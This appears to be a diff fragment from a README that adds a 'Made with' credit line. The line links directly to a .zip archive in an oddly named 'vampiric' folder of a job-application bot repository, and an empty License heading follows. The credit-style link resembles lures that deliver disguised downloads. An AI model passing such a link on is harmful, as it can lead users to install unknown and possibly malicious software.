+Made with [https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip).
 
 ## License
 
